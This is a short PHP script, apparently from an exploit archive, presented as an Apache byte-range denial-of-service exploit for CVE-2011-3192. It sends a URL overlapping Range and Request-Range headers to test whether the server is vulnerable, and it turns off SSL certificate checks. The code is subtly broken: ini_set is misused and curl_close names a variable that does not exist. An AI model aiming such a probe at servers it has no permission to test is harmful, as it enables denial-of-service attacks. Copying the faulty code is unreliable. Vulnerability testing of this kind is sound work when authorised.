<?php
ini_set(error_reporting(0));
function banner()
{
    echo "##########################################################################################################################################\n\nAlienwithin's Apache HTTP Server Byte Range DoS by Alienwithin \n\n";
    echo "CVE:  CVE-2011-3192\nOSVDB:  74721 \nBID:  49303 \nCERT:  405811 \nEDB-ID:  17696, 18221\n\n";
	echo "Disclaimer: This exploit will attempt to check for this vulnerability but will avoid huge byte ranges to cause an actual denial of service; returns first 11 bytes of response split up\n\n";
	echo "To test byte range Denial of service view response headers for byte ranges if successfully receiving them: \n\n";
    echo "php ". $_SERVER["argv"][0]. " http://example.com/ \n\n";
    echo "###########################################################################################################################################";
}
$url_param = $_SERVER["argv"][1];

if (empty($url_param)) {
    banner();
    exit();
} else {
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $url_param);
    curl_setopt($resURL, CURLOPT_HEADER, true);
    curl_setopt($resURL, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($resURL, CURLOPT_VERBOSE, true);
    curl_setopt($resURL, CURLOPT_USERAGENT, 'SpaceZilla/5.0 (SpaceOS; U; SpaceOS NT 5.1; en-US; rv:1.8.1.13) Aliens/20080311 Spacefox/2.0.0.13');
    curl_setopt($resURL, CURLOPT_HTTPHEADER, array('Request-Range: bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10,11-11',
'Range: bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10,11-11'));
	curl_setopt($resURL, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_setopt($resURL, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($resURL, CURLOPT_SSL_VERIFYPEER, 0);
    $response =  curl_exec($resURL);
	curl_close($resurl);
	echo $response;
}
